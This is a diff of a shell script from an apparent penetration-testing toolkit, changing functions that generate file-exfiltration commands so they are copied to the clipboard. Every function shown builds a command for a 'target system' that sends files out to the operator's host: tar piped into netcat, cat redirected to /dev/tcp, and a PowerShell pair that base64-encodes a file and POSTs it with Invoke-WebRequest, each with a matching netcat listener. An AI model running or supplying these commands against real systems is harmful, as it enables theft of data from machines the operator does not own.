@@ -251,17 +251,21 @@ nb-srv-updog-hosted() {
 nb-srv-nc-tar() {
     nb-vars-set-lhost
     nb-vars-set-lport
-    __cyan "Use the command below on the target system: "
-    echo "tar cfv - /path/to/send | nc ${__LHOST} ${__LPORT}"
+    __COMMAND="tar cfv - /path/to/send | nc ${__LHOST} ${__LPORT}"
+    echo "$__COMMAND" | wl-copy
+    __info "Command to use on a target system copied to clipboard"
+
     print -z "nc -nvlp ${__LPORT} | tar xfv -"
 }
 
 nb-srv-nc-file() {
     nb-vars-set-lhost
     nb-vars-set-lport
-    __cyan "Use the command below on the target system: "
-    echo "cat FILE > /dev/tcp/${__LHOST}/${__LPORT}"
-    print -z "nc -nvlp ${port} -w 5 > incoming.txt"  
+    __COMMAND="cat FILE > /dev/tcp/${__LHOST}/${__LPORT}"
+    echo "$__COMMAND" | wl-copy
+    __info "Command to use on a target system copied to clipboard"
+
+    print -z "nc -nvlp ${__LPORT} -w 5 > incoming.txt"  
 }
 
 nb-srv-nc-b64() {
@@ -280,13 +284,11 @@ nb-srv-nc-b64-web() {
     local path && __askvar path "FULL_PATH_TO_FILE"
 
     echo
-    __COMAND1=$b64 = [System.convert]::ToBase64String((Get-Content -Path '$path' -Encoding Byte))
-    __COMAND2=Invoke-WebRequest -Uri http://${__LHOST}:${__LPORT}/ -Method POST -Body \$b64
+    __COMMAND1=$b64 = [System.convert]::ToBase64String((Get-Content -Path '$path' -Encoding Byte))
+    __COMMAND2=Invoke-WebRequest -Uri http://${__LHOST}:${__LPORT}/ -Method POST -Body \$b64
     echo "$__COMMAND2" | wl-copy
     echo "$__COMMAND1" | wl-copy
-
     __info "2 Commands to use on a target system copied to clipboard"
 
-    # Run the netcat listener
     print -z "nc -lvnp ${__LPORT} -w 5 > incoming.b64 && echo '$(cat incoming.b64)' | base64 -d -w 0 > decoded.txt"
 }
